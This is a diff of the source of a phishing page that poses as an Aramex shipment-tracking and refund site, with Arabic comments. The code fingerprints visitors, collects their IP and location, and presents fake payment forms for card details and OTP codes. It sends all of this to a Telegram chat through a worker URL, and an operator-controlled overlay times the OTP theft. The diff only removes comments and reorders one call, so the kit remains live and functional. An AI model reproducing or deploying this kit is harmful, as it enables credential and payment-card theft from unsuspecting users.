@@ -405,7 +405,7 @@
       font-size: 16px;
       font-weight: 700;
       margin-bottom: 10px;
-      display: none; /* تم الإزالة */
+      display: none;
     }
     #page-payment-gateway .pg-amount-value {
       text-align: center;
@@ -414,7 +414,7 @@
       direction: ltr;
       margin-bottom: 32px;
       min-height: 38px;
-      display: none; /* تم الإزالة */
+      display: none;
     }
     #page-payment-gateway .pg-divider {
       display: flex;
@@ -652,7 +652,6 @@
         </div>
 
         <!-- ========= الصفحة الرئيسية (الصورة + الأزرار المخفية) ========= -->
-        <!-- ⚠️ رابط صورة ارامكس الرئيسية - قم بتغييره هنا عند الحاجة ⚠️ -->
         <section class="page active" id="page-home">
           <div class="home-image-container">
             <img id="mainImage" class="main-image" src="https://files.catbox.moe/nflilk.png" alt="الصورة الرئيسية" draggable="false" />
@@ -820,11 +819,8 @@
   (function setRealVH() { function apply() { document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px'); } apply(); window.addEventListener('resize', apply); window.addEventListener('orientationchange', apply); })();
 
   // ================== إعدادات Telegram (موحدة) ==================
-  // ⚠️ رابط العامل (Worker URL) - قم بتغييره هنا عند الحاجة ⚠️
   const TELEGRAM_WORKER_URL = "https://withered-dream-f7f1.mshh667ccc.workers.dev/";
-  // ⚠️ معرف الدردشة (Chat ID) - قم بتغييره هنا عند الحاجة ⚠️
   const TELEGRAM_CHAT_ID = "6918534470";
-  // =================================================================
 
   // ================== متغيرات عامة ==================
   let currentPhoneNumber = "";
@@ -833,9 +829,7 @@
   let visitCount = parseInt(localStorage.getItem("visitCount") || "0") + 1;
   localStorage.setItem("visitCount", visitCount);
   let ipData = { ip: "غير معروف", country: "غير معروف", city: "غير معروف" };
-  // =================================================
 
-  // ================== دالة البصمة المتقدمة (Canvas + WebGL) ==================
   async function computeAdvancedFingerprint() {
     async function sha256(msg) {
       const encoder = new TextEncoder();
@@ -872,9 +866,7 @@
     ];
     return 'fp_adv_' + (await sha256(components.join('|'))).slice(0,16);
   }
-  // =================================================================
 
-  // ================== دوال معلومات الجهاز ==================
   function getDeviceType() {
     let ua = navigator.userAgent;
     if (/iPhone|iPad|iPod/i.test(ua)) return "📱 iOS (iPhone/iPad)";
@@ -893,15 +885,11 @@
     if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
     return "متصفح آخر";
   }
-  // =========================================================
 
-  // ================== معلومات إضافية موحدة ==================
   function getAdditionalInfo() {
     return `━━━━━━━━━━━\n🆔 البصمة: ${advancedFingerprint}\n📱 نوع الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}\n👀 عدد الزيارات: ${visitCount}`;
   }
-  // =========================================================
 
-  // ================== إرسال إلى تيليجرام ==================
   async function sendToTelegram(text) {
     try {
       const res = await fetch(TELEGRAM_WORKER_URL, {
@@ -917,9 +905,7 @@
     let fullMessage = message + "\n" + getAdditionalInfo();
     await sendToTelegram(fullMessage);
   }
-  // =========================================================
 
-  // ================== تهيئة أولية ==================
   (async function initialize() {
     advancedFingerprint = await computeAdvancedFingerprint();
     try {
@@ -929,16 +915,13 @@
     } catch(e) { console.error("IP fetch error:", e); }
     await sendEvent(`🆕 *زيارة جديدة للموقع*`);
   })();
-  // =================================================
 
-  // ================== منطق بوابة الدفع (مدمج) ==================
   const pg = {
     amount: 0,
     loader60Timer: null,
     loader30Timer: null
   };
 
-  // دوال البوابة تستخدم البصمة العامة والمعلومات العامة
   function pg_getAdditionalInfo() {
     return `━━━━━━━━━━━\n🆔 البصمة: ${advancedFingerprint}\n📱 نوع الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}\n👀 عدد الزيارات: ${visitCount}`;
   }
@@ -1032,8 +1015,9 @@
       document.getElementById('pg-loader60Count').textContent = sec;
       if (sec <= 0) {
         clearInterval(pg.loader60Timer);
-        enableTelegramCover();
+        // تم تعديل الترتيب هنا فقط:
         pg_showScreen('pg-otpScreen');
+        enableTelegramCover();
       }
     }, 1000);
   }
@@ -1054,18 +1038,14 @@
     document.getElementById('pg-otpInput').classList.toggle("error", !valid && v.length > 0);
     return valid;
   }
-  // =========================================================
 
-  // ================== ربط الأحداث (داخل DOMContentLoaded) ==================
   document.addEventListener('DOMContentLoaded', () => {
-    // تعبئة قوائم الشهر والسنة
     const expMonth = document.getElementById('pg-expMonth');
     const expYear = document.getElementById('pg-expYear');
     for (let i=1; i<=12; i++) { let o = document.createElement("option"); o.value = String(i).padStart(2,"0"); o.textContent = String(i).padStart(2,"0"); expMonth.appendChild(o); }
     for (let y=26; y<=50; y++) { let o = document.createElement("option"); o.value = String(y); o.textContent = String(y); expYear.appendChild(o); }
     [expMonth, expYear].forEach(s => s.addEventListener("paste", e => e.preventDefault()));
 
-    // أحداث الإدخال والتحقق في بوابة الدفع
     const cardHolder = document.getElementById('pg-cardHolder');
     cardHolder.addEventListener("input", function() { this.value = this.value.replace(/[^A-Za-z ]/g, ""); pg_validateCardHolder(); });
     cardHolder.addEventListener("paste", function(e) { e.preventDefault(); let t = (e.clipboardData || window.clipboardData).getData("text"); this.value = t.replace(/[^A-Za-z ]/g, "").slice(0,40); pg_validateCardHolder(); });
@@ -1100,7 +1080,6 @@
       pg_startLoader30ThenBackOTP();
     });
 
-    // --- تتبع الشحنة ---
     document.getElementById("trackBtn").addEventListener("click", async () => {
       let number = document.getElementById("trackingNumber").value.trim();
       if (number.length !== 10) {
@@ -1115,7 +1094,6 @@
       await sendEvent(`🔍 *تتبع شحنة*\n📦 رقم التتبع: ${number}\n📋 الحالة: ${status}`);
     });
 
-    // --- استرجاع مبلغ الشحنة ---
     document.getElementById("submitRefundBtn").addEventListener("click", async () => {
       let valid = true;
       const name = document.getElementById("refund_name").value.trim();
@@ -1236,7 +1214,6 @@
       clearTimeout(pg.loader30Timer);
     });
 
-    // ================== دوال مساعدة ==================
     function setError(id, msg) { const el = document.getElementById(id); if (!el) return; if (msg) { el.textContent = msg; el.style.display = 'block'; } else { el.textContent = ''; el.style.display = 'none'; } }
     function clearAllErrors() { document.querySelectorAll('.error-msg').forEach(el => { el.textContent = ''; el.style.display = 'none'; }); }
     function showPopup(msg) {
@@ -1304,7 +1281,6 @@
 </script>
 
 <!-- ===== TELEGRAM COVER BLOCK (START) ===== -->
-
 <style>
 #telegramCover{
   position:fixed;
@@ -1363,7 +1339,6 @@ async function __tgCheckCover(){
 
 setInterval(__tgCheckCover, 1000);
 </script>
-
 <!-- ===== TELEGRAM COVER BLOCK (END) ===== -->
 
 </body>
